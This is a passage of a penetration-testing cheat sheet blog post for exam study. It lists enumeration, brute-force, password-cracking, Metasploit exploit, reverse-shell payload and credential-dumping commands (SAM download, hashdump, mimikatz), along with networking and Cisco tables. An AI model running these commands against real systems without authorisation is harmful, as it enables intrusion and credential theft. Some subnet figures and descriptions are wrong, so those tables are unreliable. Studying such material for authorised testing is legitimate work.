---
layout: blog_item
title:  "Penetration Testing Cheat Sheet"
date:   2015-06-16 23:22:10
author: Arr0way
description: 'Penetration testing cheat sheet, a quick reference sheet for penetration testing or pen testing exams.'
categories: [Cheat-Sheet]
tags:
- Windows
- SMB
- Linux
- Tools
---

* list element with functor item
{:toc}

**Penetration testing cheat sheet**, a quick reference for typical penetration testing or pen testing exams.


## Recon and Enumeration

### Nmap Enumeration

It all starts with nmap...

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
    <tr>
      <td>
        <p><code>nmap -v -sS -A -T4 target</code></p>
      </td>
      <td>
            <p>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>nmap -v -sS -p 1-65535 -A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports (takes a lot longer)</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>nmap -v -sU -sS -p 1-65535 -A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports and UDP scan (takes even longer)</p>
      </td>
    <tr>
      <td>
        <p><code>nmap -v -p 445 --script=smb-check-vulns <br>--script-args=unsafe=1 192.168.1.X</code></p>
      </td>
      <td>
            <p>Nmap script to scan for vulnerable SMB servers</p>
      </td>
    </tr>
      <td>
        <p><code>ls /usr/share/nmap/scripts/* | grep ftp</code></p>
      </td>
      <td>
            <p>Search nmap scripts for keywords</p>
      </td>
    </tr>
  </tbody>


</table>
</div>

### Other Host Discovery

Other methods of host discovery, that don't use nmap...

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>

    <tr>
      <td>
        <p><code>netdiscover -r 192.168.1.0/24</code></p>
      </td>
      <td>
            <p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP</p>
      </td>

    </tr>
  </tbody>
</table>
</div>

### SMB Enumeration

Enumerate Windows shares / Samba shares.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>nbtscan 192.168.1.0/24</code></p>
      </td>
      <td>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</td>
    </tr>

     <tr>
      <td>
        <p><code>enum4linux -a target-ip</code></p>
      </td>
      <td>
            <p>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Misc Stuffs 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>

    <tr>
      <td>
        <p><code>python -m SimpleHTTPServer 80</code></p>
      </td>
      <td>
            <p>Run a basic http server, great for serving up shells etc</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


### Mounting File Shares

How to mount NFS / CIFS, Windows and Linux file shares.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>
     <tr>
      <td>
        <p><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></p>
      </td>
      <td>
           <p>Mount NFS share to <code>/mnt/nfs</code> </p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>mount -t cifs -o username=user,password=pass<br>,domain=blah //192.168.1.X/share-name /mnt/cifs</code></p>
      </td>
      <td>
           <p>Mount Windows CIFS / SMB share on Linux at <code>/mnt/cifs</code> if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</p>
      </td>
    </tr>
    <tr>
      <td>
          <p><code>net use Z: \\win-server\share password <br> /user:domain\janedoe /savecred /p:no</code></p>
      </td>
      <td>
           <p>Mount a Windows share on Windows from the command line</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>apt-get install smb4k -y</code></p>
      </td>
      <td>
           <p>Install smb4k on Kali, useful Linux GUI for browsing SMB shares</p>
      </td>
    </tr>

  </tbody>
</table>
</div>


### Basic Finger Printing Versioning


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>

    <tr>
      <td>
        <p><code>nc -v 192.168.1.1 25</code></p>
        <p><code>telnet 192.168.1.1 25</code></p>
      </td>
      <td>
            <p>Basic versioning / finger printing via displayed banner</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


### SNMP Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>snmpcheck -t 192.168.1.X -c public</code></p>
        <p><code>snmpwalk -c public -v1 192.168.1.X 1| <br> grep hrSWRunName|cut -d* * -f </code></p>
        <p><code>snmpenum -t 192.168.1.X</code></p>
        <p><code>onesixtyone -c names -i hosts</code></p>  
      </td>
      <td>SNMP enumeration</td>
    </tr>
  </tbody>
</table>
</div>


### DNS Zone Transfers

<div class="mobile-side-scroller">
<table>
   <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>nslookup -> set type=any -> ls -d blah.com</code></p>
      </td>
      <td>
           <p>Windows DNS zone transfer</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>dig axfr blah.com @ns1.blah.com</code></p>
      </td>
      <td>
            <p>Linux DNS zone transfer</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### HTTP / HTTPS Webserver Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>nikto -h 192.168.1.1</code></p>
      </td>
      <td>
            <p>Perform a nikto scan against target</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>dirbuster</code></p>
      </td>
      <td>
            <p>Configure via GUI, CLI input doesn't work most of the time</p>
      </td>
   </tr>
  </tbody>
</table>
</div>

### Packet Inspection

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></p>
      </td>
      <td>
           <p>tcpdump for port 80 on interface eth0, outputs to output.pcap</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Username Enumeration

Some techniques used to remotely enumerate users on a target system.

#### SMB User Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>python /usr/share/doc/python-impacket-doc/examples<br>/samrdump.py 192.168.XXX.XXX</code></p>
      </td>
      <td>
           <p>Enumerate users from SMB</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### SNMP User Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

  <tr>
      <td>
        <p><code>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 <br>|cut -d” “ -f4</code></p>
      </td>
      <td>
           <p>Enmerate users from SNMP</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>python /usr/share/doc/python-impacket-doc/examples/<br>samrdump.py SNMP 192.168.X.XXX</code></p>
      </td>
      <td>
           <p>Enmerate users from SNMP</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt <br>(then grep)</code></p>
      </td>
      <td>
           <p>Search for SNMP servers with nmap, grepable output</p>
      </td>
    </tr>




  </tbody>
</table>
</div>


## Passwords

### Word lists

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
	<p><code>/usr/share/wordlists</code></p>
      </td>
      <td>
            <p>Kali word lists</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


### Brute Forcing Services

#### Hydra FTP Brute Force

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX ftp -V</code></p>
      </td>
      <td>
            <p>Hydra FTP brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### Hydra POP3 Brute Force


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <br>192.168.X.XXX pop3 -V</code></p>
      </td>
      <td>
            <p>Hydra POP3 brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### Hydra SMTP Brute Force

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></p>
      </td>
      <td>
            <p>Hydra SMTP brute force</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code>  


### Password Cracking

#### John The Ripper - JTR

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
	<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
      </td>
      <td>
            <p>JTR password cracking</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Exploit Research

Ways to find exploits for enumerated hosts / services.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>searchsploit windows 2003 | grep -i local</code></p>
      </td>
      <td>
            <p>Search exploit-db for exploit, in this example windows 2003 + local esc</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>site:exploit-db.com exploit kernel <= 3</code></p>
      </td>
      <td>
            <p>Use google to search exploit-db.com for exploits</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>grep -R "W7" /usr/share/metasploit-framework<br>/modules/exploit/windows/*</code></p>
      </td>
      <td>
            <p>Search metasploit modules using grep - msf search sucks a bit</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Compiling Exploits

Some notes on compiling exploits.

#### Identifying if C code is for Windows or Linux

C #includes will indicate which OS should be used to build the exploit.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></p>
      </td>
      <td>
            <p>Windows exploit code</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, <br> sys/sockt.h, sys/types.h, unistd.h</code></p>
      </td>
      <td>
            <p>Linux exploit code</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Build Exploit GCC

Compile exploit gcc.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>gcc -o exploit exploit.c</code></p>
      </td>
      <td>
            <p>Basic GCC compile</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Compile Windows .exe on Linux

Build / compile windows exploits on Linux, resulting in a .exe file.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></p>
      </td>
      <td>
            <p>Compile windows .exe on Linux</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

## Metasploit

Some basic Metasploit stuff, that I have found handy for reference.

### Meterpreter Payloads

#### Windows reverse meterpreter payload

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload windows/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Windows reverse tcp payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Windows VNC Meterpreter payload


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload windows/vncinject/reverse_tcp</code></p>
        <p><code>set ViewOnly false</code></p>
      </td>
      <td>
            <p>Meterpreter Windows VNC Payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Linux Reverse Meterpreter payload

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>set payload linux/meterpreter/reverse_tcp</code></p>
      </td>
      <td>
            <p>Meterpreter Linux Reverse Payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Meterpreter Commands

Some useful meterpreter commands.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>upload file c:\\windows</code></p>
      </td>
      <td>
            <p>Meterpreter upload file to Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f c:\\windows\temp\exploit.exe</code></p>
      </td>
      <td>
            <p>Meterpreter run .exe on target - handy for executing uploaded exploits</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f cmd -c </code></p>
      </td>
      <td>
            <p>Creates new channel with cmd shell</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>ps</code></p>
      </td>
      <td>
	    <p>Meterpreter show processes</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>shell</code></p>
      </td>
      <td>
	    <p>Meterpreter get shell on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>getsystem</code></p>
      </td>
      <td>
	    <p>Meterpreter attempts priviledge escalation the target</p>
      </td>
    </tr>    
    <tr>
      <td>
        <p><code>hashdump</code></p>
      </td>
      <td>
	    <p>Meterpreter attempts to dump the hashes on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd add –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
	    <p>Meterpreter create port forward to target machine</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd delete –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
	    <p>Meterpreter delete port forward</p>
      </td>
    </tr>


  </tbody>
</table>
</div>

### Common Metasploit Modules

Top metasploit modules.

#### Remote Windows Metasploit Modules (exploits)

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/windows/smb/ms08_067_netapi</code></p>
      </td>
      <td>
            <p>MS08_067 Windows 2k, XP, 2003 Remote Exploit</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use exploit/windows/dcerpc/ms06_040_netapi</code></p>
      </td>
      <td>
            <p>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use exploit/windows/smb/<br>ms09_050_smb2_negotiate_func_index</code></p>
      </td>
      <td>
            <p>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Local Windows Metasploit Modules (exploits)


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/windows/local/bypassuac</code></p>
      </td>
      <td>
            <p>Bypass UAC on Windows 7 + Set target + arch, x86/64</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


#### Auxilary Metasploit Modules

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>

    <tr>
      <td>
        <p><code>use auxiliary/scanner/http/dir_scanner</code></p>
      </td>
      <td>
            <p>Metasploit HTTP directory scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p>
      </td>
      <td>
            <p>Metasploit JBOSS vulnerability scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/mssql/mssql_login</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL Credential Scanner</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use auxiliary/scanner/mysql/mysql_version</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL Version Scanner</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use auxiliary/scanner/oracle/oracle_login</code></p>
      </td>
      <td>
            <p>Metasploit Oracle Login Module</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Metasploit Powershell Modules

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>use exploit/multi/script/web_delivery</code></p>
      </td>
      <td>
            <p>Metasploit powershell payload delivery module</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>post/windows/manage/powershell/exec_powershell</code></p>
      </td>
      <td>
            <p>Metasploit upload and run powershell script through a session</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use exploit/multi/http/jboss_maindeployer</code></p>
      </td>
      <td>
            <p>Metasploit JBOSS deploy</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>use exploit/windows/mssql/mssql_payload</code></p>
      </td>
      <td>
            <p>Metasploit MSSQL payload</p>
      </td>
    </tr>

  </tbody>
</table>
</div>


#### Post Exploit Windows Metasploit Modules

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>run post/windows/gather/win_privs</code></p>
      </td>
      <td>
            <p>Metasploit show privileges of current user</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>use post/windows/gather/credentials/gpp</code></p>
      </td>
      <td>
            <p>Metasploit grab GPP saved passwords</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>load mimikatz -> wdigest</code></p>
      </td>
      <td>
            <p>Metasplit load Mimikatz</p>
      </td>
    </tr>
      <td>
        <p><code>run post/windows/gather/local_admin_search_enum</code></p>
      </td>
      <td>
        <p>Idenitfy other machines that the supplied domain user has administrative access to</p>
      </td>
    </tr>



  </tbody>
</table>
</div>

## Networking

### TTL Fingerprinting

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Operating System</th>
      <th>TTL Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Windows</p>
      </td>
      <td>
            <p><code>128</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>Linux</p>
      </td>
      <td>
            <p><code>64</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>Solaris</p>
      </td>
      <td>
            <p><code>255</code></p>
      </td>
    </tr>
      <td>
        <p>Cisco / Network</p>
      </td>
      <td>
        <p><code>255</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>



### IPv4

#### Classful IP Ranges

E.g Class A,B,C (depreciated, but unfortunately still taught)

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Class</th>
      <th>IP Address Range</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Class A IP Address Range</p>
      </td>
      <td>
        <p><code>0.0.0.0 - 127.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class B IP Address Range</p>
      </td>
      <td>
        <p><code>128.0.0.0 - 191.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class C IP Address Range</p>
      </td>
      <td>
        <p><code>192.0.0.0 - 223.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class D IP Address Range</p>
      </td>
      <td>
        <p><code>224.0.0.0 - 239.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class E IP Address Range</p>
      </td>
      <td>
        <p><code>240.0.0.0 - 255.255.255.255</code></p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### Private Address Ranges

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Class</th>
      <th>Range</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Class A Private Address Range</p>
      </td>
      <td>
        <p><code>10.0.0.0 - 10.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class B Private Address Range</p>
      </td>
      <td>
        <p><code>172.16.0.0 - 172.31.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class C Private Address Range</p>
      </td>
      <td>
        <p><code>192.168.0.0 - 192.168.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p></p>
      </td>
      <td>
        <p><code>127.0.0.0 - 127.255.255.255</code></p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### Subnet Cheat Sheet  


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>CIDR</th>
      <th>Decimal Mask</th>
      <th>Number of Hosts</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>/31</p>
      </td>
      <td>
        <p><code>255.255.255.254</code></p>
      </td>
      <td>
        <p><code>1 Host</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/30</p>
      </td>
      <td>
        <p><code>255.255.255.252</code></p>
      </td>
      <td>
        <p><code>2 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/29</p>
      </td>
      <td>
        <p><code>255.255.255.249</code></p>
      </td>
      <td>
        <p><code>6 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/28</p>
      </td>
      <td>
        <p><code>255.255.255.240</code></p>
      </td>
      <td>
        <p><code>14 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/27</p>
      </td>
      <td>
        <p><code>255.255.255.224</code></p>
      </td>
      <td>
        <p><code>30 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/26</p>
      </td>
      <td>
        <p><code>255.255.255.192</code></p>
      </td>
      <td>
        <p><code>62 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/25</p>
      </td>
      <td>
        <p><code>255.255.255.128</code></p>
      </td>
      <td>
        <p><code>126 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/24</p>
      </td>
      <td>
        <p><code>255.255.255.0</code></p>
      </td>
      <td>
        <p><code>254 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/23</p>
      </td>
      <td>
        <p><code>255.255.254.0</code></p>
      </td>
      <td>
        <p><code>512 Host</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/22</p>
      </td>
      <td>
        <p><code>255.255.252.0</code></p>
      </td>
      <td>
        <p><code>1022 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/21</p>
      </td>
      <td>
        <p><code>255.255.248.0</code></p>
      </td>
      <td>
        <p><code>2046 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/20</p>
      </td>
      <td>
        <p><code>255.255.240.0</code></p>
      </td>
      <td>
        <p><code>4094 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/19</p>
      </td>
      <td>
        <p><code>255.255.224.0</code></p>
      </td>
      <td>
        <p><code>8190 Hosts</code></p>
      </td>
    </tr>


    <tr>
      <td>
        <p>/18</p>
      </td>
      <td>
        <p><code>255.255.192.0</code></p>
      </td>
      <td>
        <p><code>16382 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/17</p>
      </td>
      <td>
        <p><code>255.255.128.0</code></p>
      </td>
      <td>
        <p><code>32766 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/16</p>
      </td>
      <td>
        <p><code>255.255.0.0</code></p>
      </td>
      <td>
        <p><code>65534 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/15</p>
      </td>
      <td>
        <p><code>255.254.0.0</code></p>
      </td>
      <td>
        <p><code>131070 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/14</p>
      </td>
      <td>
        <p><code>255.252.0.0</code></p>
      </td>
      <td>
        <p><code>262142 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/13</p>
      </td>
      <td>
        <p><code>255.248.0.0</code></p>
      </td>
      <td>
        <p><code>524286 Hosts</code></p>
      </td>
    </tr>


    <tr>
      <td>
        <p>/12</p>
      </td>
      <td>
        <p><code>255.240.0.0</code></p>
      </td>
      <td>
        <p><code>1048674 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/11</p>
      </td>
      <td>
        <p><code>255.224.0.0</code></p>
      </td>
      <td>
        <p><code>2097150 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/10</p>
      </td>
      <td>
        <p><code>255.192.0.0</code></p>
      </td>
      <td>
        <p><code>4194302 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/9</p>
      </td>
      <td>
        <p><code>255.128.0.0</code></p>
      </td>
      <td>
        <p><code>8388606 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/8</p>
      </td>
      <td>
        <p><code>255.0.0.0</code></p>
      </td>
      <td>
        <p><code>16777214 Hosts</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>


## CISCO Commands

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>enable</code></p>
      </td>
      <td>
            <p>Enters enable mode</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>conf t</code></p>
      </td>
      <td>
            <p>Short for, configure terminal</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config)# interface fa0/0</code></p>
      </td>
      <td>
            <p>Configure FastEthernet 0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
      </td>
      <td>
            <p>Add ip to fa0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
      </td>
      <td>
            <p>Add ip to fa0/0</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-if)# line vty 0 4</code></p>
      </td>
      <td>
            <p>Configure vty line</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-line)# login</code></p>
      </td>
      <td>
            <p>Cisco set telnet password</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>(config-line)# password YOUR-PASSWORD</code></p>
      </td>
      <td>
            <p>Set telnet password</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show running-config</code></p>
      </td>
      <td>
            <p>Show running config loaded in memory</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show startup-config</code></p>
      </td>
      <td>
            <p>Show sartup config</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show version</code></p>
      </td>
      <td>
            <p>show cisco IOS version</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show session</code></p>
      </td>
      <td>
            <p>display open sessions</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code># show ip interface</code></p>
      </td>
      <td>
            <p>Show network interfaces</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show interface e0</code></p>
      </td>
      <td>
            <p>Show detailed interface info</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show ip route</code></p>
      </td>
      <td>
            <p>Show routes</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># show access-lists</code></p>
      </td>
      <td>
            <p>Show access lists</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir file systems</code></p>
      </td>
      <td>
            <p>Show available files</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir all-filesystems</code></p>
      </td>
      <td>
            <p>File information</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># dir /all</code></p>
      </td>
      <td>
            <p>SHow deleted files</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># terminal length 0</code></p>
      </td>
      <td>
            <p>No limit on terminal output</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># copy running-config tftp</code></p>
      </td>
      <td>
            <p>Copys running config to tftp server</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code># copy running-config startup-config</code></p>
      </td>
      <td>
            <p>Copy startup-config to running-config</p>
      </td>
    </tr>
  </tbody>
</table>
</div>


## Cryptography

### Hash Lengths

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>MD5 Hash Length</p>
      </td>
      <td>
